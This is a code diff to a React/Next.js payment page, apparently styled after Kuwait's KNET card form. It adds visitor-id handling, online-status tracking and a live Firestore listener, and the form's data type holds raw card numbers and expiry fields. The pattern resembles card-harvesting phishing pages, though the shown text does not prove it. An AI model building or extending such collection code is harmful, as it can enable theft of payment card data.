@@ -3,10 +3,12 @@ import { useEffect, useState } from "react"
 import "./knet.css"
 import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
-import { db, handlePay } from "@/lib/firebase"
+import { addData, db, handlePay } from "@/lib/firebase"
 import Loader from "@/components/loader"
+import { setupOnlineStatus } from "@/lib/utils"
 
 type PaymentInfo = {
+  id:string
   createdDate: string
   cardNumber: string
   year: string
@@ -119,6 +121,7 @@ export default function Payment() {
   const [isloading, setisloading] = useState(false)
   const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+    id:'',
     createdDate: new Date().toISOString(),
     cardNumber: "",
     year: "",
@@ -153,6 +156,11 @@ export default function Payment() {
 
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
+    setupOnlineStatus(visitorId!)
+    setPaymentInfo({
+      ...paymentInfo,
+      id:visitorId!,
+    })
     if (visitorId) {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
